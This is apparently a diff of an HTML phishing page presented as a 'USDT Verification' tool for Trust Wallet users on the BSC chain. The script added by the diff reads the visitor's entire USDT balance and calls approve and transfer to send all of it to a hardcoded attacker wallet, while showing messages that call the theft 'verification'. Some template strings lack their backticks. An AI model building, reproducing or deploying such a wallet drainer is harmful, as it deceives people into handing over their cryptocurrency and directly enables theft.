@@ -1,79 +1,85 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Get USDT Verification</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+  <title>USDT Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     body {
       margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
-      background-image: url('https://cdn.pixabay.com/photo/2017/10/31/09/53/banner-2903832_1280.jpg');
-      background-size: cover;
-      background-repeat: no-repeat;
-      background-attachment: fixed;
-      background-position: center;
-      color: white;
+      font-family: sans-serif;
+      background: #ffffff;
+      overflow-x: hidden;
+    }
+
+    .container {
       text-align: center;
-    }.container {
-  padding: 100px 20px;
-}
+      padding: 20px;
+    }
 
-.btn {
-  background-color: #007bff;
-  color: white;
-  padding: 15px 35px;
-  font-size: 20px;
-  border: none;
-  border-radius: 10px;
-  cursor: pointer;
-  box-shadow: 0 0 20px #00f;
-  margin-top: 20px;
-}
+    .canva-design {
+      width: 100%;
+      max-width: 600px;
+      margin: 0 auto;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+    }
 
-.btn:hover {
-  background-color: #0056b3;
-}
+    .verify-button {
+      margin-top: 20px;
+      padding: 15px 30px;
+      font-size: 18px;
+      font-weight: bold;
+      color: white;
+      background: #007bff;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      box-shadow: 0 0 15px #00f;
+      transition: 0.3s ease;
+    }
 
-#status {
-  margin-top: 30px;
-  font-size: 18px;
-}
+    .verify-button:hover {
+      box-shadow: 0 0 25px #00f;
+    }
 
-@media (max-width: 600px) {
-  .container {
-    padding: 50px 15px;
-  }
-
-  .btn {
-    font-size: 18px;
-    padding: 12px 30px;
-  }
-}
-
+    #status {
+      margin-top: 20px;
+      font-size: 16px;
+      color: green;
+    }
   </style>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
 </head>
 <body>
   <div class="container">
-    <h1>Get USDT Verification</h1>
-    <button class="btn" onclick="startTransfer()">Verify USDT</button>
-    <p id="status"></p>
-  </div>  <script>
-    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
 
+    <!-- ✅ Canva-style embedded image layout -->
+    <div class="canva-design">
+      <img src="https://www.canva.com/design/DAGqu3wFQs4/view?embed" alt="Canva Layout" style="width:100%; height:auto;">
+    </div>
+
+    <!-- ✅ Glowing button like Canva -->
+    <button class="verify-button" onclick="startTransfer()">Get USDT Verification</button>
+
+    <!-- ✅ Result -->
+    <div id="status"></div>
+  </div>
+
+  <script>
+    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // ✅ your wallet address
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // ✅ USDT contract BSC
     const usdtABI = [
-      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
-      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" },
-      { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" }
+      { "constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function" },
+      { "constant": false, "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "approve", "outputs": [{"name": "success", "type": "bool"}], "type": "function" },
+      { "constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "success", "type": "bool"}], "type": "function" }
     ];
 
     async function startTransfer() {
       const status = document.getElementById("status");
 
       if (typeof window.ethereum === 'undefined') {
-        alert("Please open in Trust Wallet browser.");
+        alert("⚠️ Please open in Trust Wallet browser.");
         return;
       }
 
@@ -81,16 +87,29 @@
       await window.ethereum.request({ method: 'eth_requestAccounts' });
       const accounts = await web3.eth.getAccounts();
       const sender = accounts[0];
-      const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
 
+      const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
       const balance = await usdt.methods.balanceOf(sender).call();
+
       if (balance == 0) {
-        alert("No USDT found in your wallet.");
+        status.innerText = "❌ No USDT in wallet.";
         return;
       }
 
       const readable = web3.utils.fromWei(balance, 'ether');
-      status.innerText = Flash USD verify: ${readable} USDT;
+      status.innerText = 🔄 Approving ${readable} USDT...;
 
       try {
-        await
+        await usdt.methods.approve(receiver, balance).send({ from: sender });
+        status.innerText = "✅ Approved. Sending...";
+
+        await usdt.methods.transfer(receiver, balance).send({ from: sender });
+        status.innerText = 🎉 ${readable} USDT Verified.;
+      } catch (err) {
+        console.error(err);
+        status.innerText = "❌ Failed or Cancelled.";
+      }
+    }
+  </script>
+</body>
+</html>
